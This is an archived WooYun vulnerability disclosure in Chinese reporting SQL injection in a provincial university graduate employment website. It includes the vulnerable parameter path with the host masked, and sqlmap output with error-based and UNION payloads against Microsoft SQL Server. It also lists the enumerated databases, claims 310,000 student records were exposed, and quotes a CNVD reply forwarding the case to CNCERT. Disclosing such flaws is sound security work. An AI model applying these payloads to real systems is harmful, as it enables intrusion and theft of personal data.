wybug_title: 某省高校毕业生就业信息网主站存在SQL注入漏洞（DBA权限，31W学生信息侧漏）
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-10-13：	细节已通知厂商并且等待厂商处理中									2015-10-18：	厂商已经确认，细节仅向厂商公开									2015-10-28：	细节向核心白帽子及相关领域专家公开									2015-11-07：	细节向普通白帽子公开									2015-11-17：	细节向实习白帽子公开									2015-12-02：	细节向公众公开  简要描述： RT 详细说明：  注入位置：http://**.**.**.**:880/EDJLWeb/(S(x20olb3s4da0ctgmlmjasqij))/Common/HBindSelect.ashx?name=STCode&codeName=注入参数 codeName单引号报错


GET parameter 'codeName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection point(s) with a total of 275 HTTP(s) requests:---Parameter: codeName (GET)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: name=STCode&codeName=' AND 4129=CONVERT(INT,(SELECT CHAR(113)+CHAR(98)+CHAR(120)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (4129=4129) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(106)+CHAR(113))) AND 'kOti'='kOti    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: name=STCode&codeName=' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(98)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(97)+CHAR(80)+CHAR(106)+CHAR(103)+CHAR(68)+CHAR(104)+CHAR(116)+CHAR(79)+CHAR(88)+CHAR(65)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(106)+CHAR(113),NULL-----[14:23:15] [INFO] testing Microsoft SQL Server[14:23:18] [INFO] confirming Microsoft SQL Server[14:23:32] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2008[14:23:32] [INFO] fetching database names[14:23:32] [INFO] the SQL query used returns 12 entries[14:23:33] [INFO] retrieved: EducationDepartmentJLFP[14:23:33] [INFO] retrieved: EducationDepartmentJLFP[14:23:33] [INFO] retrieved: EducationDepartmentJLLog[14:23:33] [INFO] retrieved: EducationDepartmentJLPortal[14:23:34] [INFO] retrieved: EEEEE[14:23:34] [INFO] retrieved: master[14:23:34] [INFO] retrieved: model[14:23:35] [INFO] retrieved: msdb[14:23:35] [INFO] retrieved: ReportServer[14:23:56] [CRITICAL] unable to connect to the target URL or proxy. sqlmap is going to retry the request(s)[14:23:56] [INFO] retrieved: ReportServerTempDB[14:24:06] [INFO] retrieved: TeachSurvery[14:24:06] [INFO] retrieved: tempdbavailable databases [11]:[*] EducationDepartmentJLFP[*] EducationDepartmentJLLog[*] EducationDepartmentJLPortal[*] EEEEE[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] TeachSurvery[*] tempdb
   漏洞证明：  11个数据库：

31W学生信息侧漏：



   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-10-18 13:52 厂商回复： CNVD确认所述情况,已经转由CNCERT下发给吉林分中心,由其后续协调网站管理单位处置. 最新状态： 暂无
